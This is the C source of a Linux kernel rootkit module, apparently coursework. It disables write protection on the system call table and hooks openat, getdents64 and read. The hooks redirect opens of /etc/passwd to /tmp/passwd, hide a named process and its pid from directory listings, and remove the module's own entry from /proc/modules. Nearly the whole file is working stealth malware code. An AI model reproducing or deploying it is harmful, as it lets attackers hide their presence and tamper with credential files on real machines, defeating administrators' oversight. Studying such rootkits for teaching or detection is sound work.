#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

static char* pid = "";
module_param(pid, charp, 0);  // charp:char pointer
MODULE_PARM_DESC(pid, "sneaky pid");  // used to document arguments that the module can take, name and description

// This is a pointer to the system call table
static unsigned long* sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void* ptr) {
    unsigned int level;
    pte_t* pte = lookup_address((unsigned long)ptr, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void* ptr) {
    unsigned int level;
    pte_t* pte = lookup_address((unsigned long)ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

// 1. Function pointer will be used to save address of the original 'openat'
// syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
// asmlinkage: 告诉gcc编译器该函数不需要通过任何寄存器来传递参数，只通过堆栈来传递
asmlinkage int (*original_openat)(struct pt_regs*);
asmlinkage int (*original_getdents64)(struct pt_regs*);  //#1 and #2
asmlinkage ssize_t (*original_read)(struct pt_regs*);

// Define your new sneaky version of the 'openat' syscall
// int openat(int dirfd, const char *pathname, int flags)
asmlinkage int sneaky_sys_openat(struct pt_regs* regs) {
    const char * pathname = (const char *)regs->si;
    if(strcmp(pathname, "/etc/passwd")==0){
        copy_to_user((void*) pathname, "/tmp/passwd", 12); //12 is the number of bytes to copy(include \0)
        //Use the character buffer passed into the openat() call
    }
    return (*original_openat)(regs);
}

// Define your new sneaky version of the 'getdents64' syscall
// int getdents64(unsigned int fd, struct linux_dirent * dirp, unsigned int count)
asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
    //getdents64 reads several linux_dirent structures from the directory fd into the buffer dirp, returns number of bytes read
    int nread = original_getdents64(regs);
    if(nread==-1) return nread;
    struct linux_dirent64* dirp = (struct linux_dirent64*)regs->si;
    int bpos = 0;
    while(bpos < nread){
        struct linux_dirent64* d = (void *)dirp + bpos;
        int d_size = d->d_reclen;
        // printk(KERN_INFO "reclen=%d\n", d->d_reclen);
        // printk(KERN_INFO "offset=%lld\n", d->d_off);
        if(strcmp(d->d_name, "sneaky_process")==0 || strcmp(d->d_name, pid)==0){    //pid is passed in using module_param
            memmove(d, (void*)d + d_size, nread-bpos-d_size);
            nread -= d_size;
        }
        else{
            bpos += d_size;
        }
    }
    return nread;
}

// Define your new sneaky version of the 'read' syscall --> hide the sneaky_module from the /proc/modules file
//ssize_t read(int fd, void *buf, size_t count), read up to count bytes from fd into the buffer starting at buf
asmlinkage ssize_t sneaky_sys_read(struct pt_regs* regs){
    ssize_t nread = original_read(regs);
    void* buf = (void*)regs->si;
    if(nread>0){
        void* start = strnstr(buf, "sneaky_mod ", nread);
        if(start){
            void* end = strnstr(start, "\n", nread-(start-buf));
            if(end){
                int length = end-start+1;
                memmove(start, end+1, nread-(start-buf)-length);
                nread -= length;
            }
        }
    }
    return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void*)sys_call_table[__NR_openat];
    original_getdents64 = (void*)sys_call_table[__NR_getdents64];
    original_read = (void*)sys_call_table[__NR_read];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void*)sys_call_table);
    
    // You need to replace other system calls you need to hack here
    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
    sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void*)sys_call_table);

    return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void*)sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long)original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_read] = (unsigned long)original_read;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void*)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");